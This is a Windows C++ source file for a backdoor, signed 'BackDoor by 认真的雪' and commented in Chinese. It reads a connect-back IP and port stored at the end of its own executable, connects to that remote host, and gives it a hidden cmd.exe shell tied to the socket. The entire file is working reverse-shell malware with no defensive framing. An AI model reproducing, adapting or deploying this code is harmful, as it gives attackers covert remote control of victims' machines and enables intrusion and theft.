// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

typedef struct _Info
{
	//存放返连IP
	char ip[100];
	//存放返连端口
	int port;
}Info;
int cmdshell(SOCKET s)
{   	
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
    CloseHandle(ProcessInformation.hProcess);	
	return 0;
}

int main(int argc, char* argv[])
{
		char wMessage[512] = "\r\n========================  BackDoor by 认真的雪  ========================\r\n"; 
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(s == INVALID_SOCKET)
	{
		printf(" socket error \n");
		return 0;
	}
	char szName[256];
	//得到自身进程文件名
	GetModuleFileName(NULL,szName,256);
	//以只读方式打开自身文件
	HANDLE hFile=CreateFile(szName,GENERIC_READ,FILE_SHARE_READ,
		        NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	//定位到配置信息处
	if(SetFilePointer(hFile,-sizeof(Info),NULL,FILE_END)==-1)
	{
		return 0;
	}

	Info mInfo={0};
	DWORD dwRead;
	//读取配置信息
	if(!ReadFile(hFile,&mInfo,sizeof(Info),&dwRead,NULL))
	{
		return 0;
	}
	//关闭文件句柄
	CloseHandle(hFile);
	sockaddr_in sin; 
	sin.sin_family = AF_INET;
	//使用配置信息中的端口
	sin.sin_port = htons(mInfo.port);
	//使用配置信息中的IP
	sin.sin_addr.S_un.S_addr = inet_addr(mInfo.ip);
	//发起连接
	if(connect(s, (sockaddr*)&sin, sizeof(sin)) == -1)
	{
		printf(" connect error \n");
		return 0;
	}
	if (send(s,wMessage,strlen(wMessage),0)==SOCKET_ERROR)
	{
        printf("Send message error \n");
        return 0;
	}

	cmdshell(s);
	return 0;
	
}
